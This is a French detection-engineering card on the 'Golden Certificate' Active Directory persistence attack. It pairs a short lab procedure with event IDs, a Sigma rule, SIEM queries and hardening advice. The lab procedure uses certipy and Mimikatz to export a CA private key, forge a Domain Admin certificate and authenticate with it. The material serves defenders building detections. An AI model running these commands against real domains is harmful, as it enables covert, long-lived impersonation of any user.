# 32 — Golden Certificate

| Champ | Valeur |
|-------|--------|
| **Tactique MITRE** | Persistence |
| **Technique MITRE** | T1649 |
| **Phase kill chain** | Persistence |
| **CVE** | — |
| **Privilèges requis** | Compromission de la clé privée de la CA (accès au serveur ADCS) |
| **Impact** | Critique (forge de certificats d'authentification arbitraires, longue durée) |

---

## 1. Description

En volant la **clé privée de l'autorité de certification (CA)** — le fichier `.pfx`/`.p12` du certificat racine — l'attaquant peut **forger lui-même des certificats** valides pour **n'importe quel utilisateur**, hors ligne, sans passer par la CA. C'est l'équivalent PKI du Golden Ticket : persistance de très longue durée (durée de vie du certif CA, souvent 5–10 ans), résistante aux changements de mots de passe et à la rotation krbtgt.

## 2. Prérequis
- Accès administrateur au serveur ADCS pour exporter la clé privée de la CA (protégée par DPAPI / éventuellement TPM/HSM).

## 3. Procédure de simulation (lab)

```bash
# 1. Voler la clé privée de la CA
certipy ca -backup -ca 'CORP-CA' -u admin@domaine.local -p pass
# ou Mimikatz : crypto::certificates /export

# 2. Forger un certificat au nom d'un DA (offline)
certipy forge -ca-pfx CORP-CA.pfx -upn administrator@domaine.local -subject 'CN=Administrator'

# 3. S'authentifier avec le certificat forgé
certipy auth -pfx administrator_forged.pfx -dc-ip 10.0.0.10
```

## 4. Télémétrie générée (logs)

| Source | Event ID | Signification |
|--------|----------|---------------|
| ADCS / Security | 4876/4877/4878 | Sauvegarde/restauration/export de la CA |
| Sysmon | 10 | Accès aux clés privées (DPAPI) sur le serveur CA |
| Security (DC) | **4768** | TGT **PKINIT** avec un certificat **non émis par la CA** (pas de 4886/4887 correspondant) |

**Anomalie clé :** authentification PKINIT (4768 avec Certificate Info) **sans demande/émission (4886/4887)** enregistrée côté CA → certificat forgé hors ligne.

## 5. Détection

### Logique
Corréler chaque **auth par certificat (PKINIT)** avec l'existence d'une **émission (4887)** correspondante côté CA. Un certificat utilisé mais **jamais émis** = forgé. Nécessite corrélation CA ↔ DC → **cas d'usage IA**.

### Règle Sigma
```yaml
title: Golden Certificate - PKINIT Auth Without CA Issuance
status: experimental
logsource:
    product: windows
    service: security
detection:
    pkinit:
        EventID: 4768
        CertificateInformation|exists: true
    ca_export:
        EventID:
            - 4876
            - 4877
    condition: pkinit or ca_export
level: high
falsepositives:
    - Requiert corrélation avec les logs d'émission de la CA
```

### Traduction SIEM
- **XSOAR :** playbook comparant les serials des certificats utilisés (PKINIT) à la base d'émission de la CA → alerte si absent.
- **Elastic :** `event.code:(4876 or 4877)` (export CA) — événement rare et sensible.

## 6. Contre-mesures / Hardening
- Protéger la clé privée de la CA (**HSM**, RunAsPPL, accès physique/admin restreint).
- Si compromission suspectée : **révoquer et renouveler la CA** (le seul vrai remède).
- Surveiller export/sauvegarde de la CA.

## 7. Features pour l'agent IA
- Auth PKINIT sans émission CA correspondante (feature de corrélation clé).
- Événements d'export/sauvegarde de la CA (rares).
- Accès aux clés privées DPAPI sur le serveur CA.

## 8. Références
- https://posts.specterops.io/certified-pre-owned-d95910965cd2
- https://github.com/ly4k/Certipy
